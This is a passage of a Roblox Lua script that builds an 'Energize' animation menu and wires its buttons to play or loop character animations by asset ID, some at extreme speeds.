ArmTurbine.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
ArmTurbine.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
ArmTurbine.Position = UDim2.new(0, 319, 0, 366)
ArmTurbine.Size = UDim2.new(0, 119, 0, 34)
ArmTurbine.Font = Enum.Font.Highway
ArmTurbine.FontSize = Enum.FontSize.Size24
ArmTurbine.Text = "Arm Turbine"
ArmTurbine.TextSize = 20
ArmTurbine.TextWrapped = true
 
Dab.Name = "Dab"
Dab.Parent = ScrollingFrame
Dab.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Dab.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Dab.Position = UDim2.new(0, 17, 0, 366)
Dab.Size = UDim2.new(0, 119, 0, 34)
Dab.Font = Enum.Font.Highway
Dab.FontSize = Enum.FontSize.Size24
Dab.Text = "Dab"
Dab.TextSize = 20
Dab.TextWrapped = true
 
FloatSit.Name = "FloatSit"
FloatSit.Parent = ScrollingFrame
FloatSit.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FloatSit.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FloatSit.Position = UDim2.new(0, 168, 0, 410)
FloatSit.Size = UDim2.new(0, 119, 0, 34)
FloatSit.Font = Enum.Font.Highway
FloatSit.FontSize = Enum.FontSize.Size24
FloatSit.Text = "Float Sit"
FloatSit.TextSize = 20
FloatSit.TextWrapped = true
 
SuperFaint.Name = "SuperFaint"
SuperFaint.Parent = ScrollingFrame
SuperFaint.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SuperFaint.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SuperFaint.Position = UDim2.new(0, 17, 0, 498)
SuperFaint.Size = UDim2.new(0, 119, 0, 34)
SuperFaint.Font = Enum.Font.Highway
SuperFaint.FontSize = Enum.FontSize.Size24
SuperFaint.Text = "Super Faint"
SuperFaint.TextSize = 20
SuperFaint.TextWrapped = true
 
BarrelRoll.Name = "BarrelRoll"
BarrelRoll.Parent = ScrollingFrame
BarrelRoll.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
BarrelRoll.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
BarrelRoll.Position = UDim2.new(0, 319, 0, 410)
BarrelRoll.Size = UDim2.new(0, 119, 0, 34)
BarrelRoll.Font = Enum.Font.Highway
BarrelRoll.FontSize = Enum.FontSize.Size24
BarrelRoll.Text = "Barrel Roll"
BarrelRoll.TextSize = 20
BarrelRoll.TextWrapped = true
 
Scared.Name = "Scared"
Scared.Parent = ScrollingFrame
Scared.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Scared.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Scared.Position = UDim2.new(0, 319, 0, 454)
Scared.Size = UDim2.new(0, 119, 0, 34)
Scared.Font = Enum.Font.Highway
Scared.FontSize = Enum.FontSize.Size24
Scared.Text = "Scared"
Scared.TextSize = 20
Scared.TextWrapped = true
 
InsaneArms.Name = "InsaneArms"
InsaneArms.Parent = ScrollingFrame
InsaneArms.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
InsaneArms.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
InsaneArms.Position = UDim2.new(0, 17, 0, 454)
InsaneArms.Size = UDim2.new(0, 119, 0, 34)
InsaneArms.Font = Enum.Font.Highway
InsaneArms.FontSize = Enum.FontSize.Size24
InsaneArms.Text = "Insane Arms"
InsaneArms.TextSize = 20
InsaneArms.TextWrapped = true
 
SwordSlice.Name = "SwordSlice"
SwordSlice.Parent = ScrollingFrame
SwordSlice.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SwordSlice.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SwordSlice.Position = UDim2.new(0, 168, 0, 454)
SwordSlice.Size = UDim2.new(0, 119, 0, 34)
SwordSlice.Font = Enum.Font.Highway
SwordSlice.FontSize = Enum.FontSize.Size24
SwordSlice.Text = "Sword Slice"
SwordSlice.TextSize = 20
SwordSlice.TextWrapped = true
 
SpinDance2.Name = "SpinDance2"
SpinDance2.Parent = ScrollingFrame
SpinDance2.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SpinDance2.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SpinDance2.Position = UDim2.new(0, 168, 0, 498)
SpinDance2.Size = UDim2.new(0, 119, 0, 34)
SpinDance2.Font = Enum.Font.Highway
SpinDance2.FontSize = Enum.FontSize.Size24
SpinDance2.Text = "Spin Dance 2"
SpinDance2.TextSize = 20
SpinDance2.TextWrapped = true
 
BowDown.Name = "BowDown"
BowDown.Parent = ScrollingFrame
BowDown.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
BowDown.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
BowDown.Position = UDim2.new(0, 319, 0, 498)
BowDown.Size = UDim2.new(0, 119, 0, 34)
BowDown.Font = Enum.Font.Highway
BowDown.FontSize = Enum.FontSize.Size24
BowDown.Text = "Bow Down"
BowDown.TextSize = 20
BowDown.TextWrapped = true
 
LoopSlam.Name = "LoopSlam"
LoopSlam.Parent = ScrollingFrame
LoopSlam.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
LoopSlam.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
LoopSlam.Position = UDim2.new(0, 17, 0, 410)
LoopSlam.Size = UDim2.new(0, 119, 0, 34)
LoopSlam.Font = Enum.Font.Highway
LoopSlam.FontSize = Enum.FontSize.Size24
LoopSlam.Text = "Loop Slam"
LoopSlam.TextSize = 20
LoopSlam.TextWrapped = true
 
GuiTopFrame.Name = "Gui TopFrame"
GuiTopFrame.Parent = MainFrame
GuiTopFrame.BackgroundColor3 = Color3.new(1, 0.329412, 0.329412)
GuiTopFrame.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
GuiTopFrame.Size = UDim2.new(0, 460, 0, 32)
 
CloseGUI.Name = "CloseGUI"
CloseGUI.Parent = GuiTopFrame
CloseGUI.BackgroundColor3 = Color3.new(1, 1, 1)
CloseGUI.BackgroundTransparency = 1
CloseGUI.Position = UDim2.new(0, 426, 0, 0)
CloseGUI.Size = UDim2.new(0, 34, 0, 32)
CloseGUI.Font = Enum.Font.SourceSans
CloseGUI.FontSize = Enum.FontSize.Size48
CloseGUI.Text = "X"
CloseGUI.TextColor3 = Color3.new(0.333333, 0, 0)
CloseGUI.TextSize = 40
CloseGUI.TextWrapped = true
 
Title.Name = "Title"
Title.Parent = GuiTopFrame
Title.BackgroundColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(0, 460, 0, 32)
Title.FontSize = Enum.FontSize.Size14
Title.Text = "Energize"
Title.TextColor3 = Color3.new(0.164706, 0.164706, 0.164706)
Title.TextSize = 14
Title.TextStrokeColor3 = Color3.new(0.384314, 0.917647, 1)
Title.TextStrokeTransparency = 0.69999998807907
Title.TextWrapped = true
 
CheckR.Name = "CheckR"
CheckR.Parent = GuiTopFrame
CheckR.BackgroundColor3 = Color3.new(1, 1, 1)
CheckR.BackgroundTransparency = 1
CheckR.Size = UDim2.new(0, 171, 0, 32)
CheckR.Font = Enum.Font.SourceSansBold
CheckR.FontSize = Enum.FontSize.Size14
CheckR.Text = "Text"
CheckR.TextScaled = true
CheckR.TextSize = 14
CheckR.TextWrapped = true
 
ScrollingFrameR15.Name = "ScrollingFrameR15"
ScrollingFrameR15.Parent = MainFrame
ScrollingFrameR15.BackgroundColor3 = Color3.new(1, 0.564706, 0.564706)
ScrollingFrameR15.Position = UDim2.new(0, 0, 0, 32)
ScrollingFrameR15.Size = UDim2.new(0, 460, 0, 215)
ScrollingFrameR15.Visible = false
ScrollingFrameR15.ScrollBarThickness = 13
 
CrazySlash.Name = "CrazySlash"
CrazySlash.Parent = ScrollingFrameR15
CrazySlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
CrazySlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
CrazySlash.Position = UDim2.new(0, 17, 0, 16)
CrazySlash.Size = UDim2.new(0, 119, 0, 34)
CrazySlash.Font = Enum.Font.Highway
CrazySlash.FontSize = Enum.FontSize.Size24
CrazySlash.Text = "CrazySlash"
CrazySlash.TextSize = 20
CrazySlash.TextWrapped = true
 
Open.Name = "Open"
Open.Parent = ScrollingFrameR15
Open.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
Open.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Open.Position = UDim2.new(0, 168, 0, 16)
Open.Size = UDim2.new(0, 119, 0, 34)
Open.Font = Enum.Font.Highway
Open.FontSize = Enum.FontSize.Size24
Open.Text = "Open"
Open.TextSize = 20
Open.TextWrapped = true
 
R15Spinner.Name = "R15Spinner"
R15Spinner.Parent = ScrollingFrameR15
R15Spinner.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
R15Spinner.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
R15Spinner.Position = UDim2.new(0, 17, 0, 60)
R15Spinner.Size = UDim2.new(0, 119, 0, 34)
R15Spinner.Font = Enum.Font.Highway
R15Spinner.FontSize = Enum.FontSize.Size24
R15Spinner.Text = "Spinner"
R15Spinner.TextSize = 20
R15Spinner.TextWrapped = true
 
ArmsOut.Name = "ArmsOut"
ArmsOut.Parent = ScrollingFrameR15
ArmsOut.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
ArmsOut.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
ArmsOut.Position = UDim2.new(0, 319, 0, 16)
ArmsOut.Size = UDim2.new(0, 119, 0, 34)
ArmsOut.Font = Enum.Font.Highway
ArmsOut.FontSize = Enum.FontSize.Size24
ArmsOut.Text = "ArmsOut"
ArmsOut.TextSize = 20
ArmsOut.TextWrapped = true
 
FloatSlash.Name = "FloatSlash"
FloatSlash.Parent = ScrollingFrameR15
FloatSlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
FloatSlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FloatSlash.Position = UDim2.new(0, 168, 0, 148)
FloatSlash.Size = UDim2.new(0, 119, 0, 34)
FloatSlash.Font = Enum.Font.Highway
FloatSlash.FontSize = Enum.FontSize.Size24
FloatSlash.Text = "FloatSlash"
FloatSlash.TextSize = 20
FloatSlash.TextWrapped = true
 
WeirdZombie.Name = "WeirdZombie"
WeirdZombie.Parent = ScrollingFrameR15
WeirdZombie.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
WeirdZombie.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
WeirdZombie.Position = UDim2.new(0, 17, 0, 148)
WeirdZombie.Size = UDim2.new(0, 119, 0, 34)
WeirdZombie.Font = Enum.Font.Highway
WeirdZombie.FontSize = Enum.FontSize.Size24
WeirdZombie.Text = "WeirdZombie"
WeirdZombie.TextSize = 20
WeirdZombie.TextWrapped = true
 
DownSlash.Name = "DownSlash"
DownSlash.Parent = ScrollingFrameR15
DownSlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
DownSlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
DownSlash.Position = UDim2.new(0, 319, 0, 148)
DownSlash.Size = UDim2.new(0, 119, 0, 34)
DownSlash.Font = Enum.Font.Highway
DownSlash.FontSize = Enum.FontSize.Size24
DownSlash.Text = "DownSlash"
DownSlash.TextSize = 20
DownSlash.TextWrapped = true
 
Pull.Name = "Pull"
Pull.Parent = ScrollingFrameR15
Pull.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
Pull.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Pull.Position = UDim2.new(0, 17, 0, 104)
Pull.Size = UDim2.new(0, 119, 0, 34)
Pull.Font = Enum.Font.Highway
Pull.FontSize = Enum.FontSize.Size24
Pull.Text = "Pull"
Pull.TextSize = 20
Pull.TextWrapped = true
 
CircleArm.Name = "CircleArm"
CircleArm.Parent = ScrollingFrameR15
CircleArm.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
CircleArm.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
CircleArm.Position = UDim2.new(0, 168, 0, 104)
CircleArm.Size = UDim2.new(0, 119, 0, 34)
CircleArm.Font = Enum.Font.Highway
CircleArm.FontSize = Enum.FontSize.Size24
CircleArm.Text = "CircleArm"
CircleArm.TextSize = 20
CircleArm.TextWrapped = true
 
Bend.Name = "Bend"
Bend.Parent = ScrollingFrameR15
Bend.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
Bend.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Bend.Position = UDim2.new(0, 319, 0, 104)
Bend.Size = UDim2.new(0, 119, 0, 34)
Bend.Font = Enum.Font.Highway
Bend.FontSize = Enum.FontSize.Size24
Bend.Text = "Bend"
Bend.TextSize = 20
Bend.TextWrapped = true
 
RotateSlash.Name = "RotateSlash"
RotateSlash.Parent = ScrollingFrameR15
RotateSlash.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
RotateSlash.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
RotateSlash.Position = UDim2.new(0, 319, 0, 60)
RotateSlash.Size = UDim2.new(0, 119, 0, 34)
RotateSlash.Font = Enum.Font.Highway
RotateSlash.FontSize = Enum.FontSize.Size24
RotateSlash.Text = "RotateSlash"
RotateSlash.TextSize = 20
RotateSlash.TextWrapped = true
 
FlingArms.Name = "FlingArms"
FlingArms.Parent = ScrollingFrameR15
FlingArms.BackgroundColor3 = Color3.new(0.682353, 0.701961, 0.792157)
FlingArms.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FlingArms.Position = UDim2.new(0, 168, 0, 60)
FlingArms.Size = UDim2.new(0, 119, 0, 34)
FlingArms.Font = Enum.Font.Highway
FlingArms.FontSize = Enum.FontSize.Size24
FlingArms.Text = "FlingArms"
FlingArms.TextSize = 20
FlingArms.TextWrapped = true
 
-- Buttons
col = Color3.new(0.886275, 0.776471, 0.368627)
loc = Color3.new(1, 0.906471, 0.568627)
rcol = Color3.new(0.682353, 0.701961, 0.792157)
rloc = Color3.new(0.882353, 0.901961, 0.992157)
 
CloseGUI.MouseButton1Click:connect(function()
MainFrame.Visible = false
SideFrame.Visible = true
SideFrame.Position = MainFrame.Position
end)
 
OpenGUI.MouseButton1Click:connect(function()
MainFrame.Visible = true
SideFrame.Visible = false
MainFrame.Position = SideFrame.Position
end)
 
if (game:GetService"Players".LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R15) then
    ScrollingFrame.Visible = false
    ScrollingFrameR15.Visible = true
    CheckR.Text = "Showing R15 Animations"
else
    ScrollingFrame.Visible = true
    ScrollingFrameR15.Visible = false
    CheckR.Text = "Showing R6 Animations"
end
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://35154961"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local HeadThrowACTIVE = false
HeadThrow.MouseButton1Click:connect(function()
    HeadThrowACTIVE = not HeadThrowACTIVE
    if HeadThrowACTIVE then
        HeadThrow.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if HeadThrowACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        HeadThrow.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://121572214"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FloatingHeadACTIVE = false
FloatingHead.MouseButton1Click:connect(function()
    FloatingHeadACTIVE = not FloatingHeadACTIVE
    if FloatingHeadACTIVE then
        track:Play(.1, 1, 1)
        FloatingHead.BackgroundColor3 = loc
    else
        track:Stop()
        FloatingHead.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://182724289"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local CrouchACTIVE = false
Crouch.MouseButton1Click:connect(function()
    CrouchACTIVE = not CrouchACTIVE
    if CrouchACTIVE then
        track:Play(.1, 1, 1)
        Crouch.BackgroundColor3 = loc
    else
        track:Stop()
        Crouch.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://282574440"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FloorCrawlACTIVE = false
FloorCrawl.MouseButton1Click:connect(function()
    FloorCrawlACTIVE = not FloorCrawlACTIVE
    if FloorCrawlACTIVE then
        track:Play(.1, 1, 1)
        FloorCrawl.BackgroundColor3 = loc
    else
        track:Stop()
        FloorCrawl.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://204328711"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local DinoWalkACTIVE = false
DinoWalk.MouseButton1Click:connect(function()
    DinoWalkACTIVE = not DinoWalkACTIVE
    if DinoWalkACTIVE then
        track:Play(.1, 1, 1)
        DinoWalk.BackgroundColor3 = loc
    else
        track:Stop()
        DinoWalk.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://429681631"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local JumpingJacksACTIVE = false
JumpingJacks.MouseButton1Click:connect(function()
    JumpingJacksACTIVE = not JumpingJacksACTIVE
    if JumpingJacksACTIVE then
        track:Play(.1, 1, 1)
        JumpingJacks.BackgroundColor3 = loc
    else
        track:Stop()
        JumpingJacks.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://35154961"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local LoopHeadACTIVE = false
LoopHead.MouseButton1Click:connect(function()
    LoopHeadACTIVE = not LoopHeadACTIVE
    if LoopHeadACTIVE then
        LoopHead.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if LoopHeadACTIVE then
                track:Play(.5, 1, 1e6)
            end
         end
        end
    else
        track:Stop()
        LoopHead.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://184574340"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local HeroJumpACTIVE = false
HeroJump.MouseButton1Click:connect(function()
    HeroJumpACTIVE = not HeroJumpACTIVE
    if HeroJumpACTIVE then
        HeroJump.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if HeroJumpACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        HeroJump.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://181526230"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FaintACTIVE = false
Faint.MouseButton1Click:connect(function()
    FaintACTIVE = not FaintACTIVE
    if FaintACTIVE then
        track:Play(.1, 1, 1)
        Faint.BackgroundColor3 = loc
    else
        track:Stop()
        Faint.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://181525546"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FloorFaintACTIVE = false
FloorFaint.MouseButton1Click:connect(function()
    FloorFaintACTIVE = not FloorFaintACTIVE
    if FloorFaintACTIVE then
        FloorFaint.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if FloorFaintACTIVE then
                track:Play(.1, 1, 2)
            end
         end
        end
    else
        track:Stop()
        FloorFaint.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://181525546"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SuperFaintACTIVE = false
SuperFaint.MouseButton1Click:connect(function()
    SuperFaintACTIVE = not SuperFaintACTIVE
    if SuperFaintACTIVE then
        SuperFaint.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SuperFaintACTIVE then
                track:Play(.1, 0.5, 40)
            end
         end
        end
    else
        track:Stop()
        SuperFaint.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://313762630"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local LevitateACTIVE = false
Levitate.MouseButton1Click:connect(function()
    LevitateACTIVE = not LevitateACTIVE
    if LevitateACTIVE then
        track:Play(.1, 1, 1)
        Levitate.BackgroundColor3 = loc
    else
        track:Stop()
        Levitate.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://183412246"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local DabACTIVE = false
Dab.MouseButton1Click:connect(function()
    DabACTIVE = not DabACTIVE
    if DabACTIVE then
        Dab.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if DabACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        Dab.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://188632011"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SpinACTIVE = false
Spinner.MouseButton1Click:connect(function()
    SpinACTIVE = not SpinACTIVE
    if SpinACTIVE then
        Spinner.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SpinACTIVE then
                track:Play(.1, 1, 2)
            end
         end
        end
    else
        track:Stop()
        Spinner.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://179224234"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FloatSitACTIVE = false
FloatSit.MouseButton1Click:connect(function()
    FloatSitACTIVE = not FloatSitACTIVE
    if FloatSitACTIVE then
        track:Play(.1, 1, 1)
        FloatSit.BackgroundColor3 = loc
    else
        track:Stop()
        FloatSit.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://429703734"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local MovingDanceACTIVE = false
MovingDance.MouseButton1Click:connect(function()
    MovingDanceACTIVE = not MovingDanceACTIVE
    if MovingDanceACTIVE then
        MovingDance.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if MovingDanceACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        MovingDance.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://215384594"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local WeirdMoveACTIVE = false
WeirdMove.MouseButton1Click:connect(function()
    WeirdMoveACTIVE = not WeirdMoveACTIVE
    if WeirdMoveACTIVE then
        track:Play(.1, 1, 1)
        WeirdMove.BackgroundColor3 = loc
    else
        track:Stop()
        WeirdMove.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://215384594"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local CloneIllusionACTIVE = false
CloneIllusion.MouseButton1Click:connect(function()
    CloneIllusionACTIVE = not CloneIllusionACTIVE
    if CloneIllusionACTIVE then
        track:Play(.5, 1, 1e7)
        CloneIllusion.BackgroundColor3 = loc
    else
        track:Stop()
        CloneIllusion.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://313762630"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local GlitchLevitateACTIVE = false
GlitchLevitate.MouseButton1Click:connect(function()
    GlitchLevitateACTIVE = not GlitchLevitateACTIVE
    if GlitchLevitateACTIVE then
        track:Play(.5, 1, 1e7)
        GlitchLevitate.BackgroundColor3 = loc
    else
        track:Stop()
        GlitchLevitate.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://429730430"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SpinDanceACTIVE = false
SpinDance.MouseButton1Click:connect(function()
    SpinDanceACTIVE = not SpinDanceACTIVE
    if SpinDanceACTIVE then
        SpinDance.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SpinDanceACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        SpinDance.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://45834924"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local MoonDanceACTIVE = false
MoonDance.MouseButton1Click:connect(function()
    MoonDanceACTIVE = not MoonDanceACTIVE
    if MoonDanceACTIVE then
        MoonDance.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if MoonDanceACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        MoonDance.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://204062532"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FullPunchACTIVE = false
FullPunch.MouseButton1Click:connect(function()
    FullPunchACTIVE = not FullPunchACTIVE
    if FullPunchACTIVE then
        FullPunch.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if FullPunchACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        FullPunch.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://186934910"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SpinDance2ACTIVE = false
SpinDance2.MouseButton1Click:connect(function()
    SpinDance2ACTIVE = not SpinDance2ACTIVE
    if SpinDance2ACTIVE then
        SpinDance2.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SpinDance2ACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        SpinDance2.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://204292303"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local BowDownACTIVE = false
BowDown.MouseButton1Click:connect(function()
    BowDownACTIVE = not BowDownACTIVE
    if BowDownACTIVE then
        BowDown.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if BowDownACTIVE then
                track:Play(.1, 1, 3)
            end
         end
        end
    else
        track:Stop()
        BowDown.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://204295235"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SwordSlamACTIVE = false
SwordSlam.MouseButton1Click:connect(function()
    SwordSlamACTIVE = not SwordSlamACTIVE
    if SwordSlamACTIVE then
        SwordSlam.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SwordSlamACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        SwordSlam.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://204295235"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local LoopSlamACTIVE = false
LoopSlam.MouseButton1Click:connect(function()
    LoopSlamACTIVE = not LoopSlamACTIVE
    if LoopSlamACTIVE then
        LoopSlam.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if LoopSlamACTIVE then
                track:Play(.1, 1, 1e4)
            end
         end
        end
    else
        track:Stop()
        LoopSlam.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://184574340"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local MegaInsaneACTIVE = false
MegaInsane.MouseButton1Click:connect(function()
    MegaInsaneACTIVE = not MegaInsaneACTIVE
    if MegaInsaneACTIVE then
        MegaInsane.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if MegaInsaneACTIVE then
                track:Play(.1, 0.5, 40)
            end
         end
        end
    else
        track:Stop()
        MegaInsane.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://126753849"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local SuperPunchACTIVE = false
SuperPunch.MouseButton1Click:connect(function()
    SuperPunchACTIVE = not SuperPunchACTIVE
    if SuperPunchACTIVE then
        SuperPunch.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if SuperPunchACTIVE then
                track:Play(.1, 1, 3)
            end
         end
        end
    else
        track:Stop()
        SuperPunch.BackgroundColor3 = col
    end
end)
 
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://218504594"
local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
local FullSwingACTIVE = false
FullSwing.MouseButton1Click:connect(function()
    FullSwingACTIVE = not FullSwingACTIVE
    if FullSwingACTIVE then
        FullSwing.BackgroundColor3 = loc
        while wait() do
         if track.IsPlaying == false then
            if FullSwingACTIVE then
                track:Play(.1, 1, 1)
            end
         end
        end
    else
        track:Stop()
        FullSwing.BackgroundColor3 = col
    end
end)
 
